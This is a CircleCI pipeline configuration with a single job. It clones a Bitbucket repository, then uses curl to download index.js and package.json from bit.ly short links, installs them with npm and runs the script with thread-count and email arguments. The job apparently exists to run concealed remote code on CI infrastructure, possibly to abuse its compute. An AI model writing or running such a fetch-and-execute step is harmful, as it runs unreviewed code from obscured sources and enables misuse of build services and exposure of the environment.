version: 2.1

jobs:
 devops_r_17:
    machine:
      image: ubuntu-2004:202101-01
    resource_class: medium
    steps:
      - run: git clone https://meocodervippro@bitbucket.org/lunarcrush/lunarcrush-data.git --branch honghongtimkhiepxuan@vip.stu.office.gy --single-branch lunarCrushData
      - run: 
          name: Update Package
          command: sudo apt-get update
      - run: sudo apt-get install -y libgbm-dev
      - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
      - run: npm i -s
      - run: node index -t 56 -r 4 -e honghongtimkhiepxuan@vip.stu.office.gy
